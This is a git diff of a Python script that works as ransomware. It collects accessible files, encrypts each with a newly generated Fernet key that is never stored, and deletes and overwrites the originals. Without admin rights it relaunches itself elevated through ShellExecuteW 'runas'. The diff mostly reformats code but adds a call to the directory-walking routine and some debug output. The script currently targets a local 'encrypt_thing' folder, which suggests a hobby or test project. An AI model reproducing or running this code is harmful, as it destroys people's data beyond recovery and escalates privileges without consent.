@@ -24,9 +24,7 @@ def is_admin():
         return False
 
 
-
-
-def get_all_accessible_files_in_Dir(init_path:str):
+def get_all_accessible_files_in_Dir(init_path: str):
     '''find all the folder it can
     :param:return: return all the folder it could find
     '''
@@ -42,9 +40,7 @@ def get_all_accessible_files_in_Dir(init_path:str):
     return files
 
 
-
-
-def get_all_accessible_folder_in_dir(init_path:str):
+def get_all_accessible_folder_in_dir(init_path: str):
     '''
     :param init_path: where to look in directory
     :return: all the directorys in there
@@ -87,6 +83,8 @@ def get_all_accessible():
         except:
             print('lol')
     final = files
+    print(f'ALL FILES : {final}')
+    input('continue')
     return final
 
 
@@ -105,17 +103,11 @@ def encrypt_file(file_path: str, F_key: Fernet):
             os.remove(file_path)
             # REWRITE FILE
             with open(file_path, 'wb') as ef:
-                print("rewrite",file_path)
+                print("rewrite", file_path)
                 ef.write(data)
                 break
         finally:
             try_count += 1
-
-
-
-
-
-
 
 
 """def encrypt_file(file_path,F_key):
@@ -131,19 +123,21 @@ def encrypt_file(file_path: str, F_key: Fernet):
 """for e in files:
     print(encrypt_file(e,cipher))"""
 
+
 # print(f"The folder returned is : {files}")
 
 
 def main():
     # Look if program is admin
     if is_admin():
+        get_all_accessible()
         files = get_all_accessible_files_in_Dir('.\\encrypt_thing')
-        own_dir = os.getcwd() # get is own directory to not encrypt itself
-        key = Fernet.generate_key() # key generator
-        cipher = Fernet(key) # hash the key
+        own_dir = os.getcwd()  # get is own directory to not encrypt itself
+        key = Fernet.generate_key()  # key generator
+        cipher = Fernet(key)  # hash the key
         for e in files:
             if e is not own_dir:
-                encrypt_file(e, cipher) # the file it receive
+                encrypt_file(e, cipher)  # the file it receive
     else:
         # Re-run the program with admin rights
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
@@ -151,4 +145,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
